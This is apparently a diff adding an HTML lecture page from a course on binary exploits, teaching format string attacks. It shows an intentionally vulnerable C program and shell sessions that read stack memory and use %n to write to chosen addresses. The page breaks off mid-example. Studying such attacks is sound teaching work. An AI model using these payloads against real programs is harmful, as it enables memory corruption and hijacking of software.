@@ -1,0 +1,1100 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-11-12 Thu 19:05 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 20: Format String Attacks II</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 20: Format String Attacks II</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline4">1. Reading Memory with Format Attack</a>
+<ul>
+<li><a href="#orgheadline1">1.1. Reading up the stack</a></li>
+<li><a href="#orgheadline2">1.2. Reading from</a></li>
+<li><a href="#orgheadline3">1.3. Using Formats to Your Advantage</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline9">2. Writing Memory with a Format Attack</a>
+<ul>
+<li><a href="#orgheadline5">2.1. Controlling where we write</a></li>
+<li><a href="#orgheadline6">2.2. Writing a Single Byte</a></li>
+<li><a href="#orgheadline7">2.3. Controlling what you write</a></li>
+<li><a href="#orgheadline8">2.4. Writting multiple bytes</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-2">
+<h2 id="orgheadline4"><span class="section-number-2">1</span> Reading Memory with Format Attack</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+To start, let's return to the simple format example that is
+vulnerable:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">s</span>=<span style="color: #ffa07a;">"Go Navy!"</span>;
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">a</span>=0xdeadbeef;
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">b</span>=0xcafebabe;
+  printf(argv[1]); <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">user controls the format</span>
+  printf(<span style="color: #ffa07a;">"\n"</span>);
+}
+</pre>
+</div>
+
+<p>
+In this example, the user controls the format to the process, so they
+can pass in format sequences, like %#08x, or %s, or %n, and cause the
+printf to perform some action. The question we are concerned with
+first is: what is actually being accessed when we do this?
+</p>
+
+<p>
+To begin, if we run this program, we can start to get a sense of what
+is going on:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./format_error AAAA
+AAAA
+user@si485H-base:demo$ ./format_error %#08x
+0xbffff754
+</pre>
+
+<p>
+So, if I pass a <code>%#08x</code> we can see that there is what seems to be an
+address printed out, and an address that is in the stack range. But,
+what is that address? Where did it come from? 
+</p>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-3">
+<h3 id="orgheadline1"><span class="section-number-3">1.1</span> Reading up the stack</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+Let's look at example <code>printf()</code> to think about how the arguments are
+passed to it:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #98fb98;">void</span> <span style="color: #87cefa;">foo</span>( ... ){
+ <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">...</span>
+ printf(<span style="color: #ffa07a;">"Format this: %d! And this: %s! And this too: %x"</span>, i, str, j);
+ <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">...</span>
+}
+</pre>
+</div>
+
+<p>
+The arguments to this function within <code>printf</code>'s and <code>foo</code>'s stack
+frame will look a little like this:
+</p>
+
+<pre class="example">
+                ... 
+            |-----------|
+          / |  ret addr |
+         /  |-----------|
+        /   |   sbp     |  (foo's return addres)
+       |    |-----------|
+       |    |  foo      |
+ foo  -|    |  local    |
+stack  |    |  variables| 
+rrame  |    |-----------|
+       |  / |    j      |
+       | /  |-----------|
+       |/   |    str    |
+       /\   |-----------|
+      |  \  |     i     |
+      |   \ |-----------|
+      |    \| fmt_str   +--&gt; "Format this: %d! ..."
+printf|     |-----------|
+stack-|     | ret addr  |  (printf's return addres)
+frame |     |-----------|
+      |     |    sbp    | &lt;- ebp
+       \    |-----------|
+        \   |  printf   |
+         \  |  local    |
+          \ |  variables| &lt;- esp
+	    '-----------'
+</pre>
+
+<p>
+Now if we were to change our function, to something like this and
+leave out the extra arguments to printf().
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #98fb98;">void</span> <span style="color: #87cefa;">foo</span>( ... ){
+ <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">...</span>
+ printf(<span style="color: #ffa07a;">"Format this: %d! And this: %s! And this too: %x"</span>); <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">&lt;--- </span>
+ <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">...</span>
+}
+</pre>
+</div>
+<p>
+Now, we can start to get a sense of what happens in the format attack:
+</p>
+
+<pre class="example">
+                ... 
+            |-----------|
+           /|  ret addr |
+          / |-----------|
+         /  |   sbp     |  (foo's return addres)
+        |   |-----------|
+        |   |  foo      |
+ foo   -|  /|  local    |
+stack    \/ |  variables| 
+rrame    /\ |-----------|
+        /  \| fmt_str   +--&gt; "Format this: %d! ..."
+printf /    |-----------|
+stack-|     | ret addr  |  (printf's return addres)
+frame |     |-----------|
+      |     |    sbp    | &lt;- ebp
+       \    |-----------|
+        \   |  printf   |
+         \  |  local    |
+          \ |  variables| &lt;- esp
+	    '-----------'
+</pre>
+
+<p>
+Even though we are no longer passing values to printf to use in the
+format, printf will reach into the stack as if they are there. The
+result is that, if we can control the formats to printf, we can view
+arbitrary values on the stack.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-3">
+<h3 id="orgheadline2"><span class="section-number-3">1.2</span> Reading from</h3>
+<div class="outline-text-3" id="text-1-2">
+<p>
+As an example of this, let's return to our function, let's try and get
+the extra variables in <code>main</code> to print out. To help with this, we'll
+add the <code>print_stack</code> function so we can see where we are:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">"print_stack.h"</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">s</span>=<span style="color: #ffa07a;">"Go Navy!"</span>;
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">a</span>=0xdeadbeef;
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">b</span>=0xcafebabe;
+
+  printf(argv[1]); <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">user controls the format</span>
+  printf(<span style="color: #ffa07a;">"\n"</span>);
+  print_stack(<span style="color: #ffa07a;">"main"</span>,2); <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">&lt;-- check out the stack here</span>
+}
+</pre>
+</div>
+<pre class="example">
+user@si485H-base:demo$ ./format_error %#08x.%#08x
+0xbffff754.0xbffff760
+--- STACK main ---
+0xbffff6c4 &lt;ebp+0xc&gt;: bffff754
+0xbffff6c0 &lt;ebp+0x8&gt;: 00000002
+0xbffff6bc &lt;ebp+0x4&gt;: b7e34a83
+0xbffff6b8 &lt;ebp&gt;: 00000000
+0xbffff6b4 &lt;ebp-0x4&gt;: 00000000
+0xbffff6b0 &lt;ebp-0x8&gt;: 08048580
+0xbffff6ac &lt;ebp-0xc&gt;: 0804865c
+0xbffff6a8 &lt;ebp-0x10&gt;: deadbeef
+0xbffff6a4 &lt;ebp-0x14&gt;: cafebabe
+0xbffff6a0 &lt;ebp-0x18&gt;: b7fc53c4
+0xbffff69c &lt;ebp-0x1c&gt;: b7e4e42d
+0xbffff698 &lt;ebp-0x20&gt;: bffff760 &lt;---!!!
+0xbffff694 &lt;ebp-0x24&gt;: 00000002
+0xbffff690 &lt;ebp-0x28&gt;: 08048665
+0xbffff68c &lt;ebp-0x2c&gt;: 0804857e
+0xbffff688 &lt;ebp-0x30&gt;: bffff6b8
+</pre>
+
+<p>
+Notice that the first value that comes out is 0xbffff754, what is
+that? Well some junk on the stack, but the second value, 0xbffff760,
+that's something. In fact we see exactly where it is. (Note, I used
+the '.' to seperaet each format to make it easier to read.)
+</p>
+
+<p>
+Let's keep going with this little experiment:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x
+0xbffff754.0xbffff760.0xb7e4e42d
+--- STACK main ---
+0xbffff6c4 &lt;ebp+0xc&gt;: bffff754
+0xbffff6c0 &lt;ebp+0x8&gt;: 00000002
+0xbffff6bc &lt;ebp+0x4&gt;: b7e34a83
+0xbffff6b8 &lt;ebp&gt;: 00000000
+0xbffff6b4 &lt;ebp-0x4&gt;: 00000000
+0xbffff6b0 &lt;ebp-0x8&gt;: 08048580
+0xbffff6ac &lt;ebp-0xc&gt;: 0804865c
+0xbffff6a8 &lt;ebp-0x10&gt;: deadbeef
+0xbffff6a4 &lt;ebp-0x14&gt;: cafebabe
+0xbffff6a0 &lt;ebp-0x18&gt;: b7fc53c4
+0xbffff69c &lt;ebp-0x1c&gt;: b7e4e42d &lt;-- !!!
+0xbffff698 &lt;ebp-0x20&gt;: bffff760
+0xbffff694 &lt;ebp-0x24&gt;: 00000002
+0xbffff690 &lt;ebp-0x28&gt;: 08048665
+0xbffff68c &lt;ebp-0x2c&gt;: 0804857e
+0xbffff688 &lt;ebp-0x30&gt;: bffff6b8
+
+
+user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x
+0xbffff744.0xbffff750.0xb7e4e42d.0xb7fc53c4
+--- STACK main ---
+0xbffff6b4 &lt;ebp+0xc&gt;: bffff744
+0xbffff6b0 &lt;ebp+0x8&gt;: 00000002
+0xbffff6ac &lt;ebp+0x4&gt;: b7e34a83
+0xbffff6a8 &lt;ebp&gt;: 00000000
+0xbffff6a4 &lt;ebp-0x4&gt;: 00000000
+0xbffff6a0 &lt;ebp-0x8&gt;: 08048580
+0xbffff69c &lt;ebp-0xc&gt;: 0804865c
+0xbffff698 &lt;ebp-0x10&gt;: deadbeef
+0xbffff694 &lt;ebp-0x14&gt;: cafebabe 
+0xbffff690 &lt;ebp-0x18&gt;: b7fc53c4 &lt;-- !!!
+0xbffff68c &lt;ebp-0x1c&gt;: b7e4e42d
+0xbffff688 &lt;ebp-0x20&gt;: bffff750
+0xbffff684 &lt;ebp-0x24&gt;: 00000002
+0xbffff680 &lt;ebp-0x28&gt;: 08048665
+0xbffff67c &lt;ebp-0x2c&gt;: 0804857e
+0xbffff678 &lt;ebp-0x30&gt;: bffff6a8
+
+
+user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x
+0xbffff744.0xbffff750.0xb7e4e42d.0xb7fc53c4.0xcafebabe
+--- STACK main ---
+0xbffff6b4 &lt;ebp+0xc&gt;: bffff744
+0xbffff6b0 &lt;ebp+0x8&gt;: 00000002
+0xbffff6ac &lt;ebp+0x4&gt;: b7e34a83
+0xbffff6a8 &lt;ebp&gt;: 00000000
+0xbffff6a4 &lt;ebp-0x4&gt;: 00000000
+0xbffff6a0 &lt;ebp-0x8&gt;: 08048580
+0xbffff69c &lt;ebp-0xc&gt;: 0804865c
+0xbffff698 &lt;ebp-0x10&gt;: deadbeef
+0xbffff694 &lt;ebp-0x14&gt;: cafebabe &lt;-- !!!
+0xbffff690 &lt;ebp-0x18&gt;: b7fc53c4
+0xbffff68c &lt;ebp-0x1c&gt;: b7e4e42d
+0xbffff688 &lt;ebp-0x20&gt;: bffff750
+0xbffff684 &lt;ebp-0x24&gt;: 00000002
+0xbffff680 &lt;ebp-0x28&gt;: 08048665
+0xbffff67c &lt;ebp-0x2c&gt;: 0804857e
+0xbffff678 &lt;ebp-0x30&gt;: bffff6a8
+
+
+user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x
+0xbffff744.0xbffff750.0xb7e4e42d.0xb7fc53c4.0xcafebabe.0xdeadbeef
+--- STACK main ---
+0xbffff6b4 &lt;ebp+0xc&gt;: bffff744
+0xbffff6b0 &lt;ebp+0x8&gt;: 00000002
+0xbffff6ac &lt;ebp+0x4&gt;: b7e34a83
+0xbffff6a8 &lt;ebp&gt;: 00000000
+0xbffff6a4 &lt;ebp-0x4&gt;: 00000000
+0xbffff6a0 &lt;ebp-0x8&gt;: 08048580
+0xbffff69c &lt;ebp-0xc&gt;: 0804865c
+0xbffff698 &lt;ebp-0x10&gt;: deadbeef &lt;-- !!!
+0xbffff694 &lt;ebp-0x14&gt;: cafebabe
+0xbffff690 &lt;ebp-0x18&gt;: b7fc53c4
+0xbffff68c &lt;ebp-0x1c&gt;: b7e4e42d
+0xbffff688 &lt;ebp-0x20&gt;: bffff750
+0xbffff684 &lt;ebp-0x24&gt;: 00000002
+0xbffff680 &lt;ebp-0x28&gt;: 08048665
+0xbffff67c &lt;ebp-0x2c&gt;: 0804857e
+0xbffff678 &lt;ebp-0x30&gt;: bffff6a8
+
+
+user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x
+0xbffff734.0xbffff740.0xb7e4e42d.0xb7fc53c4.0xcafebabe.0xdeadbeef.0x804865c
+--- STACK main ---
+0xbffff6a4 &lt;ebp+0xc&gt;: bffff734
+0xbffff6a0 &lt;ebp+0x8&gt;: 00000002
+0xbffff69c &lt;ebp+0x4&gt;: b7e34a83
+0xbffff698 &lt;ebp&gt;: 00000000
+0xbffff694 &lt;ebp-0x4&gt;: 00000000
+0xbffff690 &lt;ebp-0x8&gt;: 08048580
+0xbffff68c &lt;ebp-0xc&gt;: 0804865c  &lt;-- !!!
+0xbffff688 &lt;ebp-0x10&gt;: deadbeef
+0xbffff684 &lt;ebp-0x14&gt;: cafebabe
+0xbffff680 &lt;ebp-0x18&gt;: b7fc53c4
+0xbffff67c &lt;ebp-0x1c&gt;: b7e4e42d
+0xbffff678 &lt;ebp-0x20&gt;: bffff740
+0xbffff674 &lt;ebp-0x24&gt;: 00000002
+0xbffff670 &lt;ebp-0x28&gt;: 08048665
+0xbffff66c &lt;ebp-0x2c&gt;: 0804857e
+0xbffff668 &lt;ebp-0x30&gt;: bffff698
+</pre>
+
+<p>
+Now, we can change the last format to a <code>%s</code> and we can see the "Go Navy string"
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%s
+0xbffff734.0xbffff740.0xb7e4e42d.0xb7fc53c4.0xcafebabe.0xdeadbeef.Go Navy!
+--- STACK main ---
+0xbffff6a4 &lt;ebp+0xc&gt;: bffff734
+0xbffff6a0 &lt;ebp+0x8&gt;: 00000002
+0xbffff69c &lt;ebp+0x4&gt;: b7e34a83
+0xbffff698 &lt;ebp&gt;: 00000000
+0xbffff694 &lt;ebp-0x4&gt;: 00000000
+0xbffff690 &lt;ebp-0x8&gt;: 08048580
+0xbffff68c &lt;ebp-0xc&gt;: 0804865c
+0xbffff688 &lt;ebp-0x10&gt;: deadbeef
+0xbffff684 &lt;ebp-0x14&gt;: cafebabe
+0xbffff680 &lt;ebp-0x18&gt;: b7fc53c4
+0xbffff67c &lt;ebp-0x1c&gt;: b7e4e42d
+0xbffff678 &lt;ebp-0x20&gt;: bffff740
+0xbffff674 &lt;ebp-0x24&gt;: 00000002
+0xbffff670 &lt;ebp-0x28&gt;: 08048665
+0xbffff66c &lt;ebp-0x2c&gt;: 0804857e
+0xbffff668 &lt;ebp-0x30&gt;: bffff698
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">1.3</span> Using Formats to Your Advantage</h3>
+<div class="outline-text-3" id="text-1-3">
+<p>
+So that was a lot of work for tacking on %'s to get to "Go Navy"
+before. We can do better if we leverage the formats. In particular,
+the argument indexes format using the $.
+</p>
+
+<p>
+Recall that you can refer to a specific argument in the format, such
+as in this example:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c">printf(<span style="color: #ffa07a;">"%1$x %1$d\n"</span>,x);
+</pre>
+</div>
+<p>
+Here, we have a single argument to the format statement, but we have
+two formats. Each format usesin <code>%1$*</code> to refer to the 1'st argument
+so we can reference it twice. For example, the above is equivalent to
+the below
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c">printf(<span style="color: #ffa07a;">"%x %d\n"</span>,x,x);
+</pre>
+</div>
+<p>
+where the value being formatted is passed twice as an argument. 
+</p>
+
+<p>
+Now, let's do the same thing above to get the format to print. We can
+count 7 total format directives until we reach the string, so we can
+use the <code>%7$s</code> to print the string with a single format directive.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./format_error "%7\$s"
+Go Navy!
+--- STACK main ---
+0xbffff6c4 &lt;ebp+0xc&gt;: bffff754
+0xbffff6c0 &lt;ebp+0x8&gt;: 00000002
+0xbffff6bc &lt;ebp+0x4&gt;: b7e34a83
+0xbffff6b8 &lt;ebp&gt;: 00000000
+0xbffff6b4 &lt;ebp-0x4&gt;: 00000000
+0xbffff6b0 &lt;ebp-0x8&gt;: 08048580
+0xbffff6ac &lt;ebp-0xc&gt;: 0804865c
+0xbffff6a8 &lt;ebp-0x10&gt;: deadbeef
+0xbffff6a4 &lt;ebp-0x14&gt;: cafebabe
+0xbffff6a0 &lt;ebp-0x18&gt;: b7fc53c4
+0xbffff69c &lt;ebp-0x1c&gt;: b7e4e42d
+0xbffff698 &lt;ebp-0x20&gt;: bffff760
+0xbffff694 &lt;ebp-0x24&gt;: 00000002
+0xbffff690 &lt;ebp-0x28&gt;: 08048665
+0xbffff68c &lt;ebp-0x2c&gt;: 0804857e
+0xbffff688 &lt;ebp-0x30&gt;: bffff6b8
+</pre>
+<p>
+<i>(Note that I had to escape the dollar symbol (<code>\$</code>) because <code>$</code> is a special bash command.)</i>
+</p>
+
+<p>
+You'll be surprised how useful this is later. 
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline9" class="outline-2">
+<h2 id="orgheadline9"><span class="section-number-2">2</span> Writing Memory with a Format Attack</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+Now that you have a sense of how we can read memory arbitrarily, it is
+time to unlock the true magic of the format print: <b>writing</b> <b>to</b>
+<b>arbitrary</b> <b>memory</b>. This may not seem possible, but it totally is
+and it is <i>totally awesome</i>. The key to writing to memory is the <code>%n</code>
+format which will save the total number of bytes formatted so far. So
+conceptually, if you were to format the right number of bytes (e.g.,
+an address worth of bytes, like 0xbfff678) and then save how many
+bytes you formatted to the right place (e.g., the return address),
+then you could hijack a program! Easy, right?! Well, sometimes
+&#x2026; we'll take it in steps.
+</p>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-3">
+<h3 id="orgheadline5"><span class="section-number-3">2.1</span> Controlling where we write</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+First let's recall that the <code>%n</code> format works. The <code>%n</code> format
+directive will write how many bytes have been formatted to the address
+passed as argument that matches the <code>%n</code>.The challenge then is just
+alignment and formatting enough bytes. 
+</p>
+
+<p>
+To demonstrate this, we'll work with the following program:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #b0c4de;">#define</span> <span style="color: #eedd82;">BUF_SIZE</span> 1024
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[BUF_SIZE];
+
+  <span style="color: #00ffff;">static</span> <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">test_val</span> = 0x00414141; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">"AAA\0" as an int</span>
+
+
+  strncpy(buf, argv[1], BUF_SIZE);
+
+  printf(<span style="color: #ffa07a;">"Right: "</span>);
+  printf(<span style="color: #ffa07a;">"%s"</span>, buf);<span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">&lt;------safe</span>
+  printf(<span style="color: #ffa07a;">"\n\n"</span>);
+
+  printf(<span style="color: #ffa07a;">"Wrong: "</span>);
+  printf(buf);      <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">&lt;------vulnerable</span>
+  printf(<span style="color: #ffa07a;">"\n\n"</span>);
+
+  printf(<span style="color: #ffa07a;">"[*] test_val @ %p = %d 0x%08x\n"</span>, &amp;test_val,test_val,test_val);
+
+  exit(0);
+
+}
+</pre>
+</div>
+
+<p>
+Let's see if we can overwrite test<sub>val</sub> with any integer of our
+choosing. To start with, let's see if we can change 0x00414141 to
+0xEEDDCCBB.
+</p>
+
+<p>
+To start, we need to determine how to align everything. To do this,
+we'll begin by seeding our format string with something we can hunt
+for, like BBBB and then look to see when our formats find that. Since
+we are working in main, we are essentially hunting up the stack trying
+to find the command line argument value that is the format string we
+are passing in.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln BBBB
+Right: BBBB
+
+Wrong: BBBB
+
+[*] test_val @ 0x804a02c = 4276545 0x00414141
+
+user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x
+Right: BBBB.%#08x
+
+Wrong: BBBB.0xbffff2c0
+
+[*] test_val @ 0x804a02c = 4276545 0x00414141
+
+user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x
+Right: BBBB.%#08x.%#08x
+
+Wrong: BBBB.0xbffff2b0.0x000400
+
+[*] test_val @ 0x804a02c = 4276545 0x00414141
+
+user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x
+Right: BBBB.%#08x.%#08x.%#08x
+
+Wrong: BBBB.0xbffff2b0.0x000400.0x000004
+
+[*] test_val @ 0x804a02c = 4276545 0x00414141
+
+user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x.%#08x
+Right: BBBB.%#08x.%#08x.%#08x.%#08x
+
+Wrong: BBBB.0xbffff2b0.0x000400.0x000004.0x42424242
+
+[*] test_val @ 0x804a02c = 4276545 0x00414141
+</pre>
+
+<p>
+We found it, and the significance of that is really important because
+that means we now control one of the arguments to the format. Consider
+what happens when I change the last format directive to a <code>%n</code>.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x.%n
+Right: BBBB.%#08x.%#08x.%#08x.%n
+
+Segmentation fault (core dumped)
+</pre>
+
+<p>
+I get a segfault, and now you should all know that that means pay dirt
+for exploits. Let's see where we crashed with dmesg:
+</p>
+<pre class="example">
+user@si485H-base:demo$ dmesg | tail -1
+[4571638.361817] fmt_vuln[18555]: segfault at 42424242 ip b7e619ee sp bfffed60 error 6 in libc-2.19.so[b7e1b000+1a8000]
+</pre>
+
+<p>
+We crashed when we dereferenced 0x42424242, and we control that address.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln ABCD.%#08x.%#08x.%#08x.%n
+Right: ABCD.%#08x.%#08x.%#08x.%n
+
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[4571771.090412] fmt_vuln[18559]: segfault at 44434241 ip b7e619ee sp bfffed60 error 6 in libc-2.19.so[b7e1b000+1a8000]
+
+user@si485H-base:demo$ ./fmt_vuln $(printf "\xef\xbe\xad\xde").%#08x.%#08x.%#08x.%n
+Right: ﾭ?.%#08x.%#08x.%#08x.%n
+
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[4571823.069638] fmt_vuln[18564]: segfault at deadbeef ip b7e619ee sp bfffed60 error 7 in libc-2.19.so[b7e1b000+1a8000]
+</pre>
+
+<p>
+If we control that value, it also means that we can put anything
+there, not just deadbeef, but a totally valid address that we want to
+change.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-3">
+<h3 id="orgheadline6"><span class="section-number-3">2.2</span> Writing a Single Byte</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+Now, to write a byte, let's plug into the leading B's the address of
+the target<sub>value</sub>, which we see is 0x804a02c. We can use the command
+line printf to do that output:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%n
